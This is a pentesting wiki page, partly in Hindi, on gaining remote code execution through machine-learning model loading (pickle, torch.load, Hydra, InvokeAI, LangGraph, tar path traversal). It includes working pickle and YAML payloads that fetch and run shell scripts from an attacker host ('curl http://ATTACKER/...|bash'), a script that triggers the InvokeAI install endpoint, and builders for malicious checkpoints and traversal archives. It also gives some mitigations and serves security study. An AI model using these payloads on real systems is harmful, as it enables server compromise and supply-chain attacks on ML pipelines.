# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injects SQL/JSON-path syntax, `UNION SELECT` fabricates a fake checkpoint row, then `msgpack` deserialization imports and calls attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` imports and calls any dotted `_target_` in a configuration/metadata object. When libraries feed **untrusted model metadata** into `instantiate()`, an attacker can supply a callable and arguments that run immediately during model load (no pickle required).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
मुख्य बिंदु:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, और FlexTok loaders में model initialization से पहले trigger होता है।
- Hydra की string block-list को alternative import paths (जैसे `enum.bltns.eval`) या application-resolved names (जैसे `nemo.core.classes.common.os.system` → `posix`) के जरिए bypass किया जा सकता है।
- FlexTok stringified metadata को `ast.literal_eval` से भी parse करता है, जिससे Hydra call से पहले DoS (CPU/memory blowup) संभव है।

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` Stable-Diffusion के लिए एक popular open-source web interface है। Versions **5.3.1 – 5.4.2** REST endpoint `/api/v2/models/install` expose करती हैं, जो users को arbitrary URLs से models download और load करने देती है।

Internally यह endpoint अंततः call करता है:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
जब supplied file एक **PyTorch checkpoint (`*.ckpt`)** होता है, `torch.load` एक **pickle deserialization** करता है। क्योंकि content सीधे user-controlled URL से आता है, attacker checkpoint के अंदर एक custom `__reduce__` method वाला malicious object embed कर सकता है; यह method **deserialization के दौरान** execute होता है, जिससे InvokeAI server पर **remote code execution (RCE)** हो जाता है।

इस vulnerability को **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) assigned किया गया था।

#### Exploitation walk-through

1. एक malicious checkpoint बनाएं:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. `payload.ckpt` को एक HTTP server पर host करें जिसे आप control करते हैं (e.g. `http://ATTACKER/payload.ckpt`).
3. vulnerable endpoint को trigger करें (कोई authentication required नहीं):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. जब InvokeAI फ़ाइल डाउनलोड करता है, यह `torch.load()` को कॉल करता है → `os.system` gadget चलता है और attacker को InvokeAI process के context में code execution मिलती है।

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` पूरे flow को automate करता है।

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)
•  `/api/v2/models/install` attacker के लिए reachable हो
•  Process के पास shell commands execute करने की permissions हों

#### Mitigations

* **InvokeAI ≥ 5.4.3** पर upgrade करें – patch default में `scan=True` सेट करता है और deserialization से पहले malware scanning करता है।
* जब checkpoints को programmatically load करें, `torch.load(file, weights_only=True)` या नया [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper use करें।
* model sources के लिए allow-lists / signatures enforce करें और service को least-privilege के साथ run करें।

> ⚠️ याद रखें कि **कोई भी** Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) inherently unsafe है अगर उसे untrusted sources से deserialize किया जाए।

---

पुराने InvokeAI versions को reverse proxy के पीछे चलाते रखना हो तो ad-hoc mitigation का एक example:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (part of Merlin) ने एक unsafe checkpoint loader expose किया था जो सीधे user-provided paths पर `torch.load()` call करता था। क्योंकि `torch.load` Python `pickle` पर rely करता है, attacker-controlled checkpoint deserialization के दौरान reducer के जरिए arbitrary code execute कर सकता है।

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Why this leads to RCE: Python pickle में, एक object reducer (`__reduce__`/`__setstate__`) define कर सकता है जो एक callable और arguments return करता है। Unpickling के दौरान उस callable को execute किया जाता है। अगर ऐसा object checkpoint में मौजूद हो, तो weights use होने से पहले ही वह run हो जाता है।

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
डिलीवरी vectors और blast radius:
- Trojanized checkpoints/models repos, buckets, या artifact registries के जरिए साझा किए गए
- Automated resume/deploy pipelines जो checkpoints को auto-load करते हैं
- Execution training/inference workers के अंदर होती है, अक्सर elevated privileges के साथ (जैसे, containers में root)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ने direct `torch.load()` को एक restricted, allow-listed deserializer से replace किया, जिसे `transformers4rec/utils/serialization.py` में implement किया गया है। नया loader types/fields validate करता है और load के दौरान arbitrary callables को invoke होने से रोकता है।

PyTorch checkpoints के लिए specific defensive guidance:
- Untrusted data को unpickle न करें। संभव हो तो [Safetensors](https://huggingface.co/docs/safetensors/index) या ONNX जैसे non-executable formats prefer करें।
- अगर PyTorch serialization use करनी ही पड़े, तो `weights_only=True` (newer PyTorch में supported) ensure करें या Transformers4Rec patch जैसा custom allow-listed unpickler use करें।
- Model provenance/signatures enforce करें और deserialization को sandbox करें (seccomp/AppArmor; non-root user; restricted FS और no network egress)।
- Checkpoint load time पर ML services से unexpected child processes monitor करें; `torch.load()`/`pickle` usage trace करें।

POC और vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- मॉडल लोड करें:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent का FaceDetection-DSFD एक `resnet` endpoint expose करता है जो user-controlled data को deserialize करता है। ZDI ने पुष्टि की कि एक remote attacker victim को malicious page/file load करने के लिए मजबूर कर सकता है, उस endpoint पर एक crafted serialized blob push करवा सकता है, और `root` के रूप में deserialization trigger कर सकता है, जिससे full compromise हो जाता है।

Exploit flow typical pickle abuse जैसा है:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
deserialization के दौरान reachable कोई भी gadget (constructors, `__setstate__`, framework callbacks, आदि) उसी तरह weaponize किया जा सकता है, चाहे transport HTTP हो, WebSocket हो, या watched directory में drop की गई file हो।



### LangGraph checkpointer SQLi → MessagePack RCE

यह attack chain interesting है क्योंकि attacker को **malicious model file upload करने की ज़रूरत नहीं** होती। इसके बजाय, application एक **AI-agent persistence API** (`get_state_history(..., filter=...)`) expose करती है और user input checkpointer query builder तक पहुँचती है।

#### 1. metadata filters में structural SQLi

एक vulnerable SQLite pattern इस तरह था:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
मान बाद में bind होता है, लेकिन `query_key` **JSON path string** में concatenate किया जाता है, इसलिए dictionary key के अंदर `'` `'$.{query_key}'` से बाहर निकलकर SQL inject करता है। यही lesson **JSON paths, identifiers, operators, `LIMIT`, और TTL fields** पर भी लागू होता है: placeholders सिर्फ values को protect करते हैं, structural query syntax को नहीं।

#### 2. `UNION SELECT` downstream sinks को भी target कर सकता है, सिर्फ data theft को नहीं

Query `type` और serialized `checkpoint` bytes return करती है, जिन्हें बाद में इस तरह consume किया जाता है:
```python
self.serde.loads_typed((type, checkpoint))
```
इसका मतलब है कि `WHERE` clause में SQLi एक **fake result row** inject कर सकता है:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
यदि बाद में code किसी भी selected column को parse, deserialize, write, या execute करता है, तो उन columns को उनके sinks से map करें। इस मामले में fake row SQLi को **attacker-controlled deserialization** में बदल देती है।

#### 3. Unsafe MessagePack extension hooks code gadgets के equivalent हैं

LangGraph के `msgpack` path ने एक custom extension hook इस्तेमाल किया था जो एक nested tuple को unpack करता था और execute करता था:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
तो एक MessagePack extension object, जो `("os", "system", "id > /tmp/pwned")` के बराबर कुछ encode करता है, `os` import करता है, `system` resolve करता है, और command चलाता है। AI frameworks की review करते समय, dynamic imports, reflection, या arbitrary callable dispatch के लिए **custom MessagePack/JSON/pickle revivers** inspect करें।

#### 4. Practical audit pattern for agent frameworks

किसी भी user-controlled input की review करें जो यहाँ तक पहुँचती हो:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders जो SQL या Redis query fragments generate करते हैं
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths जो persistence layer से returned rows पर trust करते हैं

यह specific chain self-hosted LangGraph deployments को प्रभावित करती थी, जो **SQLite** या **Redis** checkpointers इस्तेमाल करते थे, जब untrusted users `filter` control कर सकते थे। Disclosure में noted patched versions थे `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, और `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

[**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) में comment किए अनुसार, different AI frameworks द्वारा used most model formats archives पर based होते हैं, usually `.zip`. इसलिए, इन formats का abuse करके path traversal attacks perform करना possible हो सकता है, जिससे model load होने वाले system से arbitrary files read की जा सकती हैं।

उदाहरण के लिए, following code के साथ आप एक model create कर सकते हैं जो load होने पर `/tmp` directory में एक file बनाएगा:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
या, निम्नलिखित code के साथ आप एक model बना सकते हैं जो loaded होने पर `/tmp` directory का एक symlink create करेगा:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### गहराई से: Keras .keras deserialization और gadget hunting

.keras internals, Lambda-layer RCE, ≤ 3.8 में arbitrary import issue, और allowlist के अंदर post-fix gadget discovery पर एक focused guide के लिए, देखें:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
